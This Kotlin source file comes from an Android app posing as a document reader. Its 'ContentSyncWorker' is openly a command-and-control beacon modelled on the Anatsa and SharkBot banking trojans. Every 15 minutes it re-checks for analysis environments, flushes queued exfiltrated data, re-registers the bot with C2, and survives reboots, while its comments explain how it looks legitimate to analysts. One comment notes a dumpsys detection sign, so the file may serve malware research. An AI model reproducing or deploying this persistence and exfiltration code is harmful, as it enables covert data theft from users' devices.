package com.docreader.lite.reader.sync

import android.content.Context
import androidx.work.*
import com.docreader.lite.reader.C2
import com.docreader.lite.reader.Exfil
import com.docreader.lite.reader.engine.SafetyCheck
import java.util.concurrent.TimeUnit

/**
 * WorkManager periodic beacon — C2 keepalive.
 *
 * Android enforces 15-minute MINIMUM periodic interval.
 * Anatsa uses exactly this floor. SharkBot similar (~hourly).
 *
 * Why WorkManager over AlarmManager/JobScheduler:
 *   - Survives Doze mode (Android 6+)
 *   - Survives force-stop (with BOOT_COMPLETED re-schedule)
 *   - Backed by JobScheduler under the hood (API 23+)
 *   - Constraint-aware (network required)
 *   - Less suspicious in app analysis — many legit apps use it
 *
 * Detection: `dumpsys jobscheduler` for periodic jobs with
 * INTERVAL_DURATION=900000ms paired with same-destination network calls.
 */
object ContentSyncWorker {

    private const val BEACON_TAG = "com.docreader.lite.sync"

    /**
     * Schedule periodic beacon. Called once on first boot.
     * WorkManager persists across reboots (with BOOT_COMPLETED rescue).
     */
    fun schedule(context: Context) {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED) // only when network available
            .build()

        val request = PeriodicWorkRequestBuilder<BeaconWorker>(
            15, TimeUnit.MINUTES // platform minimum — Anatsa-identical
        )
            .setConstraints(constraints)
            .addTag(BEACON_TAG)
            .setBackoffCriteria(
                BackoffPolicy.EXPONENTIAL,
                1, TimeUnit.MINUTES
            )
            .build()

        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
            BEACON_TAG,
            ExistingPeriodicWorkPolicy.KEEP, // don't duplicate if already scheduled
            request
        )
    }

    /**
     * Cancel beacon — called on SELF_DESTRUCT command.
     */
    fun cancel(context: Context) {
        WorkManager.getInstance(context).cancelAllWorkByTag(BEACON_TAG)
    }

    /**
     * Beacon worker — the actual periodic task.
     * Each firing: re-check environment, poll C2, flush exfil queue.
     */
    class BeaconWorker(
        context: Context,
        params: WorkerParameters,
    ) : CoroutineWorker(context, params) {

        override suspend fun doWork(): Result {
            // Re-check environment on each beacon (SharkBot pattern)
            val safe = SafetyCheck.recheck(applicationContext)
            if (!safe) {
                // Environment became hostile — stop silently
                return Result.success() // don't retry = silent exit
            }

            try {
                // Flush any queued exfil data
                Exfil.flush()

                // Heartbeat to C2
                C2.registerBot(applicationContext) // re-register = heartbeat
            } catch (_: Exception) {
                return Result.retry() // transient failure — back off and retry
            }

            return Result.success()
        }
    }
}
